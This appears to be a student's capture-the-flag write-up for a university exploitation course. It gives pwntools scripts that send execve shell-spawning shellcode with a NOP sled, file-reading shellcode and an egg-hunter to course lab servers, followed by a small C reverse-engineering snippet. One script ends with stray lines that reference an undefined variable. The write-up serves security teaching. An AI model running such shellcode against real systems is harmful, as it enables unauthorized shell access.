shellz
===========================

Flag: COMP6447{P0P_D3M_SH3LLZ}

General overview of problems faced
-------------------------------------

overwrite return address to pop da shell

Script/Command used
------------------
```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

execve = """
    a:
    mov eax, 0x0b;
    pop ebx;
    mov ecx, 0;
    mov edx, 0;
    int 0x80;
"""
nope = 'nop;'*(8169)

payload = asm(execve + nope + 'call a;')

p = remote("plzpwn.me","3000")
p.recvuntil('address: ')

hexA = p.recv(10)
stack_address = int(hexA,16)

p.sendline(payload + "/bin/sh\0" + p32(stack_address))
p.interactive()
```

simple
=============

Flag: COMP6447{trivial}

General overview of problems faced
-------------------------------------
look at some syscalls


Script/Command used
------------------
```
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
p = remote("plzpwn.me","3001")

shellcode = """
    call a
    a:
    mov eax, 0x3;
    mov ebx, 1000;
    mov ecx, esp;
    add ecx, 0x44;
    mov edx, 0x20;
    int 0x80;
    mov eax, 0x4;
    mov ebx, 0x1;
    mov ecx, esp;
    add ecx, 0x44;
    mov edx, 0x20;
    int 0x80;
    pop esp;
    ret
"""

ass = asm(shellcode) + "\0"*20
p.sendline(ass)
p.interactive()
```

find-me
=============

Flag: COMP6447{H4NT_D3M_3GGZ}

General overview of problems faced
-------------------------------------
had to learn the hard way why you can't do arithmetic after cmp


Script/Command used
------------------
```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

big_code = """
    call a
    a:
    mov eax, 0x3;
    mov ebx, 1000;
    mov ecx, esp;
    add ecx, 0x44;
    mov edx, 0x20;
    int 0x80;
    mov eax, 0x4;
    mov ebx, 0x1;
    mov ecx, esp;
    add ecx, 0x44;
    mov edx, 0x20;
    int 0x80;
"""
small_code = """
    b:
    add eax, 0x4;
    cmp dword ptr [eax], 0x90909090
    jne b;
    jmp eax;
"""

p = remote("plzpwn.me", "3002")
p.recvuntil("new stack ")
address = p.recv(10)
p.recv()
p.sendline(asm(small_code))
p.recv()
p.sendline(p32(0x90909090)*4 + asm(big_code)+"flag")
p.recv()
p.interactive()

ass = asm(shellcode) + "\0"*20
p.sendline(ass)
p.interactive()
```

re challenge
=============

General overview of problems faced
-------------------------------------
what problems?

```
#include <stdio.h>
int main() {
	int i = 0;
	while (i <= 9) {
		if (i&1) {
			printf("%d ", i);
        }
		i++;
	}
	return 1;
}

